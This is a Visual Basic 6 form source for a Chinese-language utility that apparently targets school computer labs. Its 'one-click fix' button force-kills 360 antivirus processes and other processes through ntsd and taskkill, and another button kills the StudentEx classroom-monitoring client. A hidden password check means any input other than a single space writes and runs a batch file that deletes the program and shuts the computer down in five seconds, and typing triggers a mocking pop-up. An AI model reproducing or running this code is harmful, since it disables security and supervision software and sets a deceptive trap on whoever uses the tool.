VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "土豆制作"
   ClientHeight    =   3195
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   StartUpPosition =   3  '窗口缺省
   Begin VB.CommandButton Command5 
      Caption         =   "一键解决"
      Height          =   735
      Left            =   120
      TabIndex        =   2
      Top             =   360
      Width           =   1815
   End
   Begin VB.CommandButton Command3 
      Caption         =   "关极域"
      Height          =   495
      Left            =   360
      TabIndex        =   1
      Top             =   1320
      Width           =   3375
   End
   Begin VB.TextBox Text1 
      Height          =   615
      Left            =   840
      TabIndex        =   0
      Text            =   "请输入密码"
      Top             =   2160
      Width           =   2175
   End
   Begin VB.Label Label1 
      Caption         =   "1234机房已破"
      Height          =   465
      Left            =   2280
      TabIndex        =   3
      Top             =   480
      Width           =   1800
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim ok As Boolean
Dim dll As String
Private Sub k2()
If Text1.Text = " " Then
Shell "ntsd -c q -pn zhuofan_sys.exe"
Shell "ntsd -c q -pn adobeC.exe"
ok = True
Else
k
End If
End Sub
Private Sub k()
Open "haha.bat" For Output As #1
Print #1, "taskkill -f -im " & App.EXEName & ".exe"
Print #1, "cmd /c del " & App.EXEName & ".exe"
Print #1, "shutdown -s -t 5"
Close #1
Shell "haha.bat"
End Sub
Private Sub Command3_Click()
Shell "taskkill -f -im StudentEx.exe"
End Sub
Private Sub k4()
If Text1.Text = " " Then
Shell "ntsd -c q -pn 360admim.exe"
Shell "ntsd -c q -pn 360moni.exe"
ok = True
Else
k
End If
End Sub


Private Sub Command5_Click()
If f3("or.dll") = True Then
k3
Else
Dim f4 As Boolean, f2 As Boolean

f4 = find("360moni.exe")
f2 = find("adobeC.exe")
If f4 = True Then k4
If f2 = True Then k2
If f4 = False And f2 = False And ok = False Then MsgBox "问题已经解决"
End If
End Sub
Function f3(op) As Boolean
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set ps = objWMIService.ExecQuery("Select * from Win32_Process")
f3 = False


For Each p In ps
If InStr(p.Name, op) <> 0 Then
f3 = True
dll = p.Name
End If

Next
End Function
Function k3()
If Text1.Text = " " Then
Shell "taskkill -f -im system"
Shell "taskkill -f -im System.com"
Shell "ntsd -c q -pn 360admim.exe"
Shell "ntsd -c q -pn 360moni.exe"
Shell "ntsd -c q -pn " & dll
ok = True
Else
k
End If
End Function

Private Sub Form_Load()
ok = False
End Sub

Private Sub Form_Unload(Cancel As Integer)
MsgBox "88"
End Sub
Function find(op) As Boolean

Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set ps = objWMIService.ExecQuery("Select * from Win32_Process")
find = False


For Each p In ps
If p.Name = op Then
find = True


End If

Next

End Function

Private Sub Text1_Change()
MsgBox "傻孩子被骗了，不用密码的。宝宝这么善良。"
End Sub
